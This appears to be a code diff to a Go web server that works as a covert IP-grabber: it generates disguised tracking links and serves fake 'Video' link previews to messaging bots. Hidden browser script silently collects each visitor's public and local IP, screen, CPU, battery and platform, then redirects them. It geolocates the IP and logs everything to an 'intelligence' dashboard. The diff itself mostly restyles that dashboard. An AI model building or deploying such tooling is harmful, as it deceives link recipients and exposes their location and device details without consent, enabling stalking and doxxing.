@@ -83,18 +83,18 @@ func getRealIP(r *http.Request) string {
 
 func getISPAndLocation(ip string, ua string) string {
 	if ip == "127.0.0.1" || ip == "::1" || strings.HasPrefix(ip, "192.168.") {
-		return "Local Network / Internal"
+		return "Local Network"
 	}
 
 	lowerUA := strings.ToLower(ua)
 	if strings.Contains(lowerUA, "telegram") {
-		return "Telegram Bot [Preview]"
+		return "Telegram Bot"
 	}
 	if strings.Contains(lowerUA, "whatsapp") {
-		return "WhatsApp Bot [Preview]"
+		return "WhatsApp Bot"
 	}
 	if strings.Contains(lowerUA, "facebookexternalhit") || strings.Contains(lowerUA, "messenger") {
-		return "Meta Bot [Preview]"
+		return "Meta Bot"
 	}
 
 	resp, err := http.Get(fmt.Sprintf("http://ip-api.com/json/%s?fields=status,country,city,isp,org", ip))
@@ -160,7 +160,7 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
 			publicIP := getRealIP(r)
 			location := getISPAndLocation(publicIP, ua)
 			db.Exec("INSERT INTO captures (code, public_ip, local_ip, port, location, device_info) VALUES (?, ?, ?, ?, ?, ?)",
-				code, publicIP, "Bot", "N/A", location, "🤖 [Bot Preview] UA: "+ua[:40])
+				code, publicIP, "Bot", "N/A", location, "🤖 [Bot] UA: "+ua[:30])
 
 			w.Header().Set("Content-Type", "text/html; charset=utf-8")
 			fmt.Fprintf(w, `<!DOCTYPE html><html><head><meta property="og:title" content="Video"><meta property="og:image" content="https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600"></head><body></body></html>`)
@@ -177,8 +177,8 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
 			port := r.RemoteAddr
 			location := getISPAndLocation(publicIP, ua)
 
-			deviceInfo := fmt.Sprintf("OS: %s | Screen: %s | Cores: %s | Battery: %s | Lang: %s",
-				r.FormValue("platform"), r.FormValue("screen"), r.FormValue("hardware"), r.FormValue("battery"), r.FormValue("lang"))
+			deviceInfo := fmt.Sprintf("OS: %s | Screen: %s | Cores: %s | Battery: %s",
+				r.FormValue("platform"), r.FormValue("screen"), r.FormValue("hardware"), r.FormValue("battery"))
 
 			db.Exec("INSERT INTO captures (code, public_ip, local_ip, port, location, device_info) VALUES (?, ?, ?, ?, ?, ?)",
 				code, publicIP, localIP, port, location, deviceInfo)
@@ -209,14 +209,13 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
                     }
                 }
             };
-            setTimeout(() => { if (!found) callback("Cellular/Direct"); }, 50);
+            setTimeout(() => { if (!found) callback("Cellular"); }, 50);
         }
 
         async function extractAndRedirect() {
             let screenRes = window.screen.width + "x" + window.screen.height;
             let cores = navigator.hardwareConcurrency || "N/A";
             let platform = navigator.platform || "N/A";
-            let lang = navigator.language || "N/A";
             let batteryInfo = "N/A";
             try {
                 if (navigator.getBattery) {
@@ -232,7 +231,6 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
                 params.append('hardware', cores);
                 params.append('battery', batteryInfo);
                 params.append('platform', platform);
-                params.append('lang', lang);
 
                 navigator.sendBeacon ? navigator.sendBeacon(window.location.href, params) : fetch(window.location.href, {method: 'POST', body: params, keepalive:true});
 
@@ -298,57 +296,123 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>لوحة الاستخبارات</title>
+    <title>Code Terminal - Intelligence</title>
     <style>
-        body { background: #0b0f17; color: #e2e8f0; font-family: sans-serif; padding: 15px; }
-        .box { background: #131b2e; border: 1px solid #1e293b; padding: 15px; border-radius: 8px; margin-bottom: 15px; max-width: 900px; margin-left: auto; margin-right: auto; }
-        input[type="text"] { width: 100%; padding: 10px; background: #020617; border: 1px solid #334155; color: #fff; border-radius: 5px; margin-bottom: 10px; }
-        button { background: #6366f1; color: #fff; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-weight: bold; width: 100%; }
-        .result { background: #020617; border: 1px solid #10b981; padding: 10px; border-radius: 5px; margin-top: 10px; word-break: break-all; }
-        .table-wrap { width: 100%; overflow-x: auto; }
-        table { width: 100%; min-width: 600px; border-collapse: collapse; margin-top: 10px; font-size: 12px; }
-        th, td { border: 1px solid #1e293b; padding: 8px; text-align: center; }
-        th { background: #020617; color: #94a3b8; }
+        body { 
+            background-color: #0d1117; 
+            background-image: radial-gradient(rgba(0, 255, 128, 0.05) 1px, transparent 1px);
+            background-size: 24px 24px;
+            color: #c9d1d9; 
+            font-family: 'Courier New', Courier, monospace; 
+            padding: 10px; 
+            margin: 0; 
+        }
+        .box { 
+            background: #161b22; 
+            border: 1px solid #30363d; 
+            padding: 14px; 
+            border-radius: 6px; 
+            margin-bottom: 15px; 
+            box-shadow: 0 4px 12px rgba(0,0,0,0.5);
+        }
+        input[type="text"] { 
+            width: 100%; 
+            padding: 10px; 
+            background: #0d1117; 
+            border: 1px solid #30363d; 
+            color: #58a6ff; 
+            border-radius: 4px; 
+            margin-bottom: 10px; 
+            font-size: 13px; 
+            font-family: 'Courier New', Courier, monospace;
+            box-sizing: border-box; 
+        }
+        input[type="text"]:focus {
+            border-color: #58a6ff;
+            outline: none;
+            box-shadow: 0 0 5px rgba(88, 166, 255, 0.4);
+        }
+        button { 
+            background: #238636; 
+            color: #fff; 
+            border: none; 
+            padding: 10px; 
+            border-radius: 4px; 
+            cursor: pointer; 
+            font-weight: bold; 
+            width: 100%; 
+            font-size: 13px; 
+            font-family: 'Courier New', Courier, monospace;
+        }
+        button:hover { background: #2ea043; }
+        .result { 
+            background: #0d1117; 
+            border: 1px solid #238636; 
+            padding: 10px; 
+            border-radius: 4px; 
+            margin-top: 10px; 
+            word-break: break-all; 
+        }
+        .copy-btn { 
+            background: #1f6feb; 
+            margin-top: 8px; 
+            padding: 6px; 
+            font-size: 11px; 
+        }
+        .copy-btn:hover { background: #388bfd; }
+        .table-wrap { width: 100%; overflow-x: auto; -webkit-overflow-scrolling: touch; }
+        table { width: 100%; min-width: 550px; border-collapse: collapse; margin-top: 8px; font-size: 11px; font-family: 'Courier New', Courier, monospace; }
+        th, td { border: 1px solid #30363d; padding: 6px; text-align: center; white-space: nowrap; }
+        th { background: #21262d; color: #8b949e; }
     </style>
+    <script>
+        function copyLink() {
+            var linkText = document.getElementById("genLink").innerText;
+            navigator.clipboard.writeText(linkText).then(function() {
+                alert("تم نسخ الرابط البرمجي بنجاح!");
+            });
+        }
+    </script>
 </head>
 <body>
     <div class="box">
-        <h3>توليد رابط تتبع (مع خانة الرمز المخصص)</h3>
+        <h3 style="margin-top:0; font-size:13px; color:#58a6ff;">// [SYSTEM] - توليد رابط تتبع بررمز مخصص</h3>
         <form method="POST">
-            <input type="text" name="target_url" placeholder="الرابط المستهدف (مثال: tiktok.com/...)" required autocomplete="off">
-            <input type="text" name="custom_code" placeholder="رمز التتبع المخصص (اختياري)" autocomplete="off">
-            <button type="submit">إنشاء الرابط</button>
+            <input type="text" name="target_url" placeholder="target_url (tiktok.com/...)" required autocomplete="off">
+            <input type="text" name="custom_code" placeholder="custom_tracking_code (optional)" autocomplete="off">
+            <button type="submit">generate_link()</button>
         </form>
         {{if .GeneratedLink}}
         <div class="result">
-            <strong>الرابط النشط:</strong><br>
-            <a href="{{.GeneratedLink}}" target="_blank" style="color: #38bdf8;">{{.GeneratedLink}}</a>
+            <span style="font-size:11px; color:#3fb950; font-weight:bold;">Active Link:</span><br>
+            <span id="genLink" style="color: #58a6ff; font-size: 12px;">{{.GeneratedLink}}</span>
+            <button type="button" class="copy-btn" onclick="copyLink()">copy_to_clipboard</button>
         </div>
         {{end}}
     </div>
 
-    <div class="box" style="max-width: 1100px;">
-        <h3>سجلات الاستخبارات المركزة</h3>
+    <div class="box">
+        <h3 style="margin-top:0; font-size:13px; color:#58a6ff;">// [DATABASE] - سجلات الاستخبارات</h3>
         <div class="table-wrap">
             <table>
                 <tr>
                     <th>ID</th>
-                    <th>الرمز</th>
-                    <th>IP العام</th>
-                    <th>IP المحلي</th>
-                    <th>المزود والشبكة</th>
-                    <th>تفاصيل العتاد والنظام</th>
-                    <th>الوقت</th>
+                    <th>Code</th>
+                    <th>Public IP</th>
+                    <th>Local IP</th>
+                    <th>ISP / Network</th>
+                    <th>Hardware & OS</th>
+                    <th>Timestamp</th>
                 </tr>
                 {{range .Captures}}
                 <tr>
                     <td>{{.ID}}</td>
-                    <td style="color:#6366f1; font-weight:bold;">{{.Code}}</td>
-                    <td style="color:#38bdf8;">{{.PublicIP}}</td>
-                    <td style="color:#fbbf24;">{{.LocalIP}}</td>
-                    <td style="color:#10b981;">{{.Location}}</td>
-                    <td style="color:#fb7185;">{{.DeviceInfo}}</td>
-                    <td>{{.CreatedAt}}</td>
+                    <td style="color:#58a6ff; font-weight:bold;">{{.Code}}</td>
+                    <td style="color:#7ee787;">{{.PublicIP}}</td>
+                    <td style="color:#d29922;">{{.LocalIP}}</td>
+                    <td style="color:#3fb950;">{{.Location}}</td>
+                    <td style="color:#ff7b72;">{{.DeviceInfo}}</td>
+                    <td style="color:#8b949e;">{{.CreatedAt}}</td>
                 </tr>
                 {{end}}
             </table>
@@ -364,6 +428,6 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
 func main() {
 	initDB()
 	http.HandleFunc("/", mainHandler)
-	fmt.Println("[*] Server running on port 8080...")
+	fmt.Println("[*] Terminal Server running on port 8080...")
 	http.ListenAndServe(":8080", nil)
 }
